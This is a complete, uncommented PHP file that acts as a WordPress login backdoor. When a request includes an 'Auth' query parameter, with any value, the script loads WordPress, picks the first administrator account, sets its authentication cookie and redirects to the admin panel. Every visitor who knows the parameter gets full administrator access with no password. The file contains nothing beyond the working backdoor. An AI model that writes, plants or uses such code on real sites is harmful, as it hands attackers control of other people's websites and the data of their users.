<?php
if (!isset($_GET['Auth'])) {
    exit('Access Denied');
}
$mr = $_SERVER["DOCUMENT_ROOT"];
@chdir($mr);
if (!file_exists("wp-load.php")) {
    exit('WordPress load file not found');
}
require_once "wp-load.php";
$wuq = new WP_User_Query(array(
    'role'   => 'Administrator',
    'number' => 1,
    'fields' => 'ID'
));
$r = $wuq->get_results();
if (!is_array($r) || count($r) == 0 || !isset($r[0])) {
    exit('No Administrator Found');
}
wp_set_auth_cookie($r[0]);
wp_redirect(admin_url());
exit();
?>
